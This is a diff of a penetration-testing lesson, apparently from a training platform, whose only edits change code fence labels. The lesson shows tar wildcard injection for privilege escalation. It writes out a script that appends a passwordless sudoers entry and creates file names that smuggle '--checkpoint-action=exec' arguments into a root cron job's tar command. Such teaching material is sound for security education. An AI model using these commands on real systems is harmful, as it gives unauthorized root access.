@@ -5,7 +5,7 @@ A wildcard character can be used as a replacement for other characters and are i
 
 An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:
 
-```sh
+```shellsession
 $ man tar
 
 <SNIP>
@@ -21,7 +21,7 @@ The `--checkpoint-action` option permits an `EXEC` action to be executed when a 
 
 Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.
 
-```sh
+```shellsession
 #
 #
 mh dom mon dow command
@@ -30,7 +30,7 @@ mh dom mon dow command
 
 We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.
 
-```sh
+```shellsession
 $ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 $ echo "" > "--checkpoint-action=exec=sh root.sh"
 $ echo "" > --checkpoint=1
@@ -50,7 +50,7 @@ drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
 
 Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.
 
-```sh
+```shellsession
 $ sudo -l
 
 Matching Defaults entries for htb-student on NIX02:
